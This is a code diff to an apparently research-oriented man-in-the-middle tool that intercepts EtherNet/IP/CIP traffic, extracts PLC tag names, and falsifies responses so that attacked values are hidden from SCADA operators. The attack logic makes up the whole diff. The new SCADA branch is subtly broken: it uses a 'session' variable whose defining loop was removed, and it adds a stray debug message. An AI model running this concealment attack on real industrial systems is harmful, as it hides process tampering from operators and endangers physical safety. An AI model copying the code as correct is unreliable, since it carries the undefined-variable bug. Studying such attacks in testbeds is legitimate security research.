@@ -22,6 +22,30 @@ class ConcealmentError(Error):
     """Raised when there is an error in the concealment parameter"""
 
 
+def extract_tag_name(payload):
+    """
+    Extract tag name from a CIP Read/Write packet based on CIP path structure.
+
+    CIP path starts after the service code and class/instance/attribute segments.
+    Logical segment format:
+    - Byte 0: segment type (usually 0x91 for symbolic segment)
+    - Byte 1: number of 16-bit words (N)
+    - Next N*2 bytes: ASCII tag name, padded if odd-length
+    """
+    try:
+        for i in range(40, 80):  # scan likely region
+            if payload[i] == 0x91:  # 0x91 = symbolic logical segment
+                tag_len_words = payload[i + 1]
+                tag_bytes = payload[i + 2 : i + 2 + tag_len_words * 2]
+                tag = tag_bytes.decode("ascii", errors="ignore").rstrip("\x00").strip()
+                tag = tag.split(":")[0]  # Drop CIP instance number
+
+                return tag
+        return ""
+    except Exception as e:
+        return ""
+
+
 class ConcealmentMiTMNetfilterQueue(PacketQueue):
 
     def __init__(self, intermediate_yaml_path: Path, yaml_index: int, queue_number: int):
@@ -225,13 +249,14 @@ class ConcealmentMiTMNetfilterQueue(PacketQueue):
     def handle_enip_response(self, ip_payload):
         this_session = int.from_bytes(ip_payload[Raw].load[4:8], sys.byteorder)
         this_context = int.from_bytes(ip_payload[Raw].load[12:20], sys.byteorder)
-
         # When target is SCADA, the concealment session will be stored in attack_session_ids
         if self.intermediate_attack['target'].lower() == 'scada':
-            for session in self.attack_session_ids:
-                if session['session'] == this_session and session['context'] == this_context:
-                    #self.logger.debug('Concealing to SCADA: ' + str(this_session))
-                    return self.handle_concealment(session, ip_payload)
+            tag_name = extract_tag_name(ip_payload[Raw].load)
+            this_tag = self.get_attack_tag(tag_name)
+            
+            if this_tag:
+                self.logger.debug("YESSSSSSSSSSSSSSSS")
+                return self.handle_concealment(session, ip_payload)
 
         # Attack values to PLCs
         for session in self.attack_session_ids:
@@ -250,15 +275,15 @@ class ConcealmentMiTMNetfilterQueue(PacketQueue):
     def handle_enip_request(self, ip_payload):
 
         this_session = int.from_bytes(ip_payload[Raw].load[4:8], sys.byteorder)
-        tag_name = ip_payload[Raw].load.decode(encoding='latin-1')[54:60].split(':')[0]
+        tag_name = extract_tag_name(ip_payload[Raw].load)
         context = int.from_bytes(ip_payload[Raw].load[12:20], sys.byteorder)
 
         #self.logger.debug('this tag is: ' + str(tag_name))
         this_tag = self.get_attack_tag(tag_name)
 
         if this_tag:
-            # self.logger.debug('Tag name: ' + str(tag_name))
-            #self.logger.debug('Attack tag: ' + str(this_tag['tag']))
+            self.logger.debug('Tag name: ' + str(tag_name))
+            self.logger.debug('Attack tag: ' + str(this_tag['tag']))
             session_dict = {'session': this_session, 'tag': this_tag['tag'], 'context': context}
             #self.logger.debug('session dict: ' + str(session_dict))
 
@@ -266,7 +291,7 @@ class ConcealmentMiTMNetfilterQueue(PacketQueue):
                 #self.logger.debug('SCADA Req session')
                 self.scada_session_ids.append(session_dict)
             else:
-                #self.logger.debug('PLC Req session')
+                self.logger.debug('PLC Req session')
                 self.attack_session_ids.append(session_dict)
 
     def capture(self, packet):
@@ -281,7 +306,8 @@ class ConcealmentMiTMNetfilterQueue(PacketQueue):
 
         try:
             p = IP(packet.get_payload())
-            if 'TCP' in p:
+
+            if 'TCP' in p and Raw in p:
                 if len(p) == 102:
                     p[Raw].load, modified = self.handle_enip_response(p)
                     if modified:
